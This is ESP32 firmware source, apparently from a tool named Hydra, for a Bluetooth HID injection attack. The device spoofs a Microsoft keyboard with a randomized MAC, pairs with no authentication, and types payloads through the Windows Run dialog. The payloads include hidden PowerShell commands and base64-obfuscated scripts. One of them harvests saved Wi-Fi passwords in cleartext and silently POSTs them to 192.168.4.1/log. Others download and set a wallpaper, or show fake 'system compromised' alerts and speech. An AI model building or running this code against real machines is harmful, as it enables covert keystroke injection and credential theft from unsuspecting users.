/**
 * @file attack_payload_attack.c
 * @brief Bluetooth payload attacks
 */

#include "bt_payload_attack.h"
#include "BleKeyboard.h"
#include "nvs_flash.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_random.h"
#include "esp_system.h"
#include "esp_mac.h"
#include "nvs_flash.h"
#include "nvs.h"

static const char *TAG = "BT_PAYLOAD_ATK";

#define KB_MANUFACTURER "Microsoft"
#define KB_BATTERY      100
#define CONNECT_POLL_MS 500

static BleKeyboard      *s_keyboard  = nullptr;
static TaskHandle_t      s_task      = nullptr;
static volatile bool     s_running   = false;
static bool              s_init_done = false;
static volatile int      s_payload   = 1;
static volatile bool     s_run_now   = false;
static volatile bool     s_is_busy   = false;
static char              s_current_name[32] = {0};
static uint8_t           s_current_mac[6] = {0};

typedef enum { KB_LAYOUT_US = 0, KB_LAYOUT_FR, KB_LAYOUT_DE } kb_layout_t;
static kb_layout_t s_kb_layout = KB_LAYOUT_FR;

static void load_kb_layout(void) {
    char layout[8] = "fr";
    nvs_handle_t nvs;
    if (nvs_open("storage", NVS_READONLY, &nvs) == ESP_OK) {
        size_t len = sizeof(layout);
        nvs_get_str(nvs, "kb_layout", layout, &len);
        nvs_close(nvs);
    }
    if      (strcmp(layout, "us") == 0) s_kb_layout = KB_LAYOUT_US;
    else if (strcmp(layout, "de") == 0) s_kb_layout = KB_LAYOUT_DE;
    else                                s_kb_layout = KB_LAYOUT_FR;
    ESP_LOGI(TAG, "Keyboard layout: %s", layout);
}

static void kb_write_one(char c) {
    if (s_kb_layout == KB_LAYOUT_FR) {
        switch (c) {
        case 'a': s_keyboard->write('q');  return;
        case 'A': s_keyboard->write('Q');  return;
        case 'q': s_keyboard->write('a');  return;
        case 'Q': s_keyboard->write('A');  return;
        case 'z': s_keyboard->write('w');  return;
        case 'Z': s_keyboard->write('W');  return;
        case 'w': s_keyboard->write('z');  return;
        case 'W': s_keyboard->write('Z');  return;
        case 'm': s_keyboard->write(';');  return;
        case 'M': s_keyboard->write(':');  return;
        case ',': s_keyboard->write('m');  return;
        case ';': s_keyboard->write(',');  return;
        case ':': s_keyboard->write('>');  return;
        case '-': s_keyboard->write('6');  return;
        case '_': s_keyboard->write('8');  return;
        case '(': s_keyboard->write('5');  return;
        case ')': s_keyboard->write('-');  return;
        case '"': s_keyboard->write('3');  return;
        case 39:  /* apostrophe, KEY_4 no-shift = apostrophe on AZERTY */
            s_keyboard->write('4');  return;
        case '1': case '2': case '3': case '4': case '5':
        case '6': case '7': case '8': case '9': case '0':
            s_keyboard->press(KEY_LEFT_SHIFT);
            vTaskDelay(pdMS_TO_TICKS(20));
            s_keyboard->press((uint8_t)c);
            vTaskDelay(pdMS_TO_TICKS(30));
            s_keyboard->releaseAll();
            vTaskDelay(pdMS_TO_TICKS(20));
            return;
        default:  s_keyboard->write((uint8_t)c); return;
        }
    } else if (s_kb_layout == KB_LAYOUT_DE) {
        switch (c) {
        case 'y': s_keyboard->write('z'); return;
        case 'Y': s_keyboard->write('Z'); return;
        case 'z': s_keyboard->write('y'); return;
        case 'Z': s_keyboard->write('Y'); return;
        default:  s_keyboard->write((uint8_t)c); return;
        }
    } else {
        s_keyboard->write((uint8_t)c);
    }
}


bool bt_payload_is_busy(void) { return s_is_busy; }
bool bt_payload_is_connected(void) { return (s_keyboard && s_keyboard->isConnected()); }

const char* bt_payload_get_connected_name(void) {
    if (s_keyboard && s_keyboard->isConnected()) {
        return s_current_name;
    }
    return "None";
}

const char* bt_payload_get_connected_mac(void) {
    static char mac_str[18];
    if (s_keyboard && s_keyboard->isConnected()) {
        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 s_current_mac[0], s_current_mac[1], s_current_mac[2],
                 s_current_mac[3], s_current_mac[4], s_current_mac[5]);
        return mac_str;
    }
    return "00:00:00:00:00:00";
}

static void generate_random_name_and_mac(void) {
    // 1. Generate a random name (e.g., HydraBT-4829)
    uint16_t rand_num = (esp_random() % 9000) + 1000;
    snprintf(s_current_name, sizeof(s_current_name), "HydraBT-%d", rand_num);

    // 2. Generate 6 random bytes for the MAC address
    for (int i = 0; i < 6; i++) {
        s_current_mac[i] = esp_random() & 0xFF;
    }


    s_current_mac[0] = (s_current_mac[0] & 0xFC) | 0x02;

    esp_base_mac_addr_set(s_current_mac);

    ESP_LOGI(TAG, "Hardware Base MAC updated to: %02X:%02X:%02X:%02X:%02X:%02X",
             s_current_mac[0], s_current_mac[1], s_current_mac[2],
             s_current_mac[3], s_current_mac[4], s_current_mac[5]);
}

static void kb_print(const char *str) {
    while (*str) {
        kb_write_one(*str++);
        vTaskDelay(pdMS_TO_TICKS(15));
    }
}

static void do_notepad_sequence(void) {
    vTaskDelay(pdMS_TO_TICKS(2000));
    s_keyboard->press(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(150));
    s_keyboard->press('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(1000));
    kb_print("notepad");
    vTaskDelay(pdMS_TO_TICKS(150));
    s_keyboard->write(KEY_RETURN);
    vTaskDelay(pdMS_TO_TICKS(1500));

    kb_print("You are hacked");

    s_keyboard->write(KEY_RETURN);
}

static void do_payload_2(void) {
    const char* rick_url = "https://youtu.be/dQw4w9WgXcQ";

    s_keyboard->press(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(150));
    s_keyboard->press('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(1000));

    for (const char* p = rick_url; *p; p++) {
        s_keyboard->write((uint8_t)*p);
    }
    vTaskDelay(pdMS_TO_TICKS(150));
    s_keyboard->write(KEY_RETURN);
}

static void do_payload_3(void) {
    const char* cmd =
    "powershell -w h -c "
    "\"$p=$env:TEMP+'\\\\b.jpg';"
    "(New-Object Net.WebClient).DownloadFile('https://i.imgur.com/l3L2Op7.jpeg',$p);"
    "Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name Wallpaper -Value $p;"
    "rundll32.exe user32.dll,UpdatePerUserSystemParameters,1,True\"";

    s_keyboard->press(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(150));
    s_keyboard->press('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(800));

    kb_print(cmd);
    vTaskDelay(pdMS_TO_TICKS(300));
    s_keyboard->write(KEY_RETURN);
}

static void do_payload_5(void) {
    /* Prank: TTS + error popup — no network needed, all built-in Windows */
    static const char *enc =
        "QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFAAcgBlAHMA"
        "ZQBuAHQAYQB0AGkAbwBuAEYAcgBhAG0AZQB3AG8AcgBrADsAJAB2AD0ATgBlAHcALQBPAGIA"
        "agBlAGMAdAAgAC0AQwBvAG0ATwBiAGoAZQBjAHQAIABTAEEAUABJAC4AUwBwAFYAbwBpAGMA"
        "ZQA7ACQAdgAuAFMAcABlAGEAawAoACIASAB5AGQAcgBhACAAaABhAHMAIABlAG4AdABlAHIA"
        "ZQBkACAAdABoAGUAIABzAHkAcwB0AGUAbQAuACAAWQBvAHUAcgAgAGYAaQBsAGUAcwAgAGEA"
        "cgBlACAAYgBlAGkAbgBnACAAcAByAG8AYwBlAHMAcwBlAGQALgAiACkAOwBbAFMAeQBzAHQA"
        "ZQBtAC4AVwBpAG4AZABvAHcAcwAuAE0AZQBzAHMAYQBnAGUAQgBvAHgAXQA6ADoAUwBoAG8A"
        "dwAoACIAQwBSAEkAVABJAEMAQQBMACAARQBSAFIATwBSADoAIABTAHkAcwB0AGUAbQAgAGMA"
        "bwBtAHAAcgBvAG0AaQBzAGUAZAAuACAASAB5AGQAcgBhACAAaQBzACAAcgB1AG4AbgBpAG4A"
        "ZwAuACIALAAiAFAAcgBvAGoAZQBjAHQAIABIAHkAZAByAGEAIgAsACIATwBLACIALAAiAEUA"
        "cgByAG8AcgAiACkAfABPAHUAdAAtAE4AdQBsAGwA";

    s_keyboard->press(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(150));
    s_keyboard->press('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(800));

    kb_print("powershell -EncodedCommand ");
    /* Base64 is layout-safe: A-Z 0-9 + / = only */
    for (const char *p = enc; *p; p++) s_keyboard->write((uint8_t)*p);
    vTaskDelay(pdMS_TO_TICKS(300));
    s_keyboard->write(KEY_RETURN);
}

static void do_payload_4(void) {
    /*
     * WiFi password harvester — fully offline, BLE-only.
     * Script runs via EncodedCommand (base64 UTF-16LE), needs no network.
     * Results saved to %TEMP%\h.txt; also silently tries to POST to
     * 192.168.4.1/log if the victim happens to be on the ESP32 AP.
     */
    static const char *enc =
        "JABwAD0AKABuAGUAdABzAGgAIAB3AGwAYQBuACAAcwBoAG8AdwAgAHAAcgBvAGYAaQBsAGUA"
        "cwB8AFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAiAEEAbABsACAAVQBzAGUAcgAgAFAA"
        "cgBvAGYAaQBsAGUAIgB8ACUAewAkAF8ALgBUAG8AUwB0AHIAaQBuAGcAKAApAC4AUwBwAGwA"
        "aQB0ACgAIgA6ACIAKQBbADEAXQAuAFQAcgBpAG0AKAApAH0AKQA7ACQAcgA9ACIAIgA7AGYA"
        "bwByAGUAYQBjAGgAKAAkAG4AIABpAG4AIAAkAHAAKQB7ACQAawA9ACgAbgBlAHQAcwBoACAA"
        "dwBsAGEAbgAgAHMAaABvAHcAIABwAHIAbwBmAGkAbABlACAAbgBhAG0AZQA9ACIAJABuACIA"
        "IABrAGUAeQA9AGMAbABlAGEAcgB8AFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAiAEsA"
        "ZQB5ACAAQwBvAG4AdABlAG4AdAAiAHwAJQB7ACQAXwAuAFQAbwBTAHQAcgBpAG4AZwAoACkA"
        "LgBTAHAAbABpAHQAKAAiADoAIgApAFsAMQBdAC4AVAByAGkAbQAoACkAfQApADsAaQBmACgA"
        "JABrACkAewAkAHIAKwA9ACIAUwBTAEkARAA6ACIAKwAkAG4AKwAiACAAUABhAHMAcwA6ACIA"
        "KwAkAGsAKwAiAGAAbgAiAH0AZQBsAHMAZQB7ACQAcgArAD0AIgBTAFMASQBEADoAIgArACQA"
        "bgArACIAIABQAGEAcwBzADoAWwBPAFAARQBOAF0AYABuACIAfQB9ADsAJAByAHwATwB1AHQA"
        "LQBGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAGgALgB0AHgAdAAiADsAdAByAHkA"
        "ewBpAHIAbQAgACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAAuADEALwBsAG8A"
        "ZwAiACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAEIAbwBkAHkAIAAkAHIAIAAtAFQA"
        "aQBtAGUAbwB1AHQAUwBlAGMAIAA1AH0AYwBhAHQAYwBoAHsAfQA=";

    s_keyboard->press(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(150));
    s_keyboard->press('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(800));

    kb_print("powershell -w h -EncodedCommand ");
    /* Base64 chars are layout-safe — send raw without AZERTY remapping */
    for (const char *p = enc; *p; p++) s_keyboard->write((uint8_t)*p);
    vTaskDelay(pdMS_TO_TICKS(300));
    s_keyboard->write(KEY_RETURN);
}

static void execute_current_payload(void) {
    if (s_is_busy) {
        ESP_LOGW(TAG, "Already busy, skipping");
        return;
    }
    s_is_busy = true;

    ESP_LOGI(TAG, "Executing Payload %d...", s_payload);

    switch (s_payload) {
        case 2: do_payload_2(); break;
        case 3: do_payload_3(); break;
        case 4: do_payload_4(); break;
        case 5: do_payload_5(); break;
        default: do_notepad_sequence(); break;
    }

    s_is_busy = false;
    ESP_LOGI(TAG, "Payload %d completed", s_payload);
}

static void keyboard_task(void *arg) {
    ESP_LOGI(TAG, "Task started - advertising as \"%s\"", s_current_name);


    while (s_running && !s_keyboard->isConnected()) {
        vTaskDelay(pdMS_TO_TICKS(CONNECT_POLL_MS));
    }

    if (!s_running) {
        vTaskDelete(nullptr);
        return;
    }

    ESP_LOGI(TAG, "Device connected! Ready for payloads.");

    while (s_running) {
        if (s_run_now && !s_is_busy && s_keyboard->isConnected()) {
            s_run_now = false;
            execute_current_payload();
        }


        if (!s_keyboard->isConnected()) {
            ESP_LOGI(TAG, "Device disconnected");
            break;
        }

        vTaskDelay(pdMS_TO_TICKS(100));
    }

    vTaskDelete(nullptr);
}

extern "C" void bt_payload_attack_init(void) {
    if (s_init_done) {
        return;
    }

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    s_init_done = true;
}

extern "C" void bt_payload_attack_start(int payload) {
    if (s_running) {
        return;
    }

    if (!s_init_done) bt_payload_attack_init();

    load_kb_layout();  /* pick up kb_layout from NVS every run */

    s_payload = (payload > 0) ? payload : 1;

    // Generate new name and MAC every time
    generate_random_name_and_mac();

    ble_hs_cfg.sm_io_cap = BLE_SM_IO_CAP_NO_IO;
    ble_hs_cfg.sm_bonding = 0;
    ble_hs_cfg.sm_mitm = 0;
    ble_hs_cfg.sm_sc = 0;
    ble_hs_cfg.sm_oob_data_flag = 0;


    s_keyboard = new BleKeyboard(s_current_name, KB_MANUFACTURER, KB_BATTERY, nullptr);


    struct ble_gap_adv_params adv_params = {
        .conn_mode = BLE_GAP_CONN_MODE_UND,     // connectable undirected
        .disc_mode = BLE_GAP_DISC_MODE_GEN,     // general discoverable
        .itvl_min = BLE_GAP_ADV_ITVL_MS(100),   // 100ms interval
        .itvl_max = BLE_GAP_ADV_ITVL_MS(150),   // 150ms max
        .channel_map = 0x07,                    // Channels (37, 38, 39)
        .filter_policy = 0,
        .high_duty_cycle = 0,
    };


    s_keyboard->begin();

    ble_gap_adv_stop();
    vTaskDelay(pdMS_TO_TICKS(100));
    ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER,
                      &adv_params, NULL, NULL);

    s_running = true;
    s_run_now = false;
    s_is_busy = false;

    xTaskCreatePinnedToCore(keyboard_task, "bt_payload_kb", 8192, nullptr, 5, &s_task, 1);

    ESP_LOGI(TAG, "Attack started (payload=%d, name=%s)", s_payload, s_current_name);
}

extern "C" void bt_payload_attack_stop(void) {
    if (!s_running) return;

    s_running = false;
    vTaskDelay(pdMS_TO_TICKS(1000));

    if (s_task) {
        vTaskDelete(s_task);
        s_task = nullptr;
    }

    if (s_keyboard) {
        s_keyboard->end();
        #pragma GCC diagnostic push
        #pragma GCC diagnostic ignored "-Wdelete-non-virtual-dtor"
        delete s_keyboard;
        #pragma GCC diagnostic pop
        s_keyboard = nullptr;
    }


    s_init_done = false;
    memset(s_current_name, 0, sizeof(s_current_name));

}

extern "C" void bt_payload_attack_set_payload(int payload) {
    if (payload >= 1 && payload <= 5) {
        s_payload = payload;
        ESP_LOGI(TAG, "Payload changed to %d", payload);
    }
}

extern "C" void bt_payload_attack_run_now(void) {
    if (!s_running) {
        ESP_LOGW(TAG, "Attack not running");
        return;
    }
    if (!s_keyboard || !s_keyboard->isConnected()) {
        ESP_LOGW(TAG, "No device connected");
        return;
    }
    if (s_is_busy) {
        return;
    }

    s_run_now = true;
}


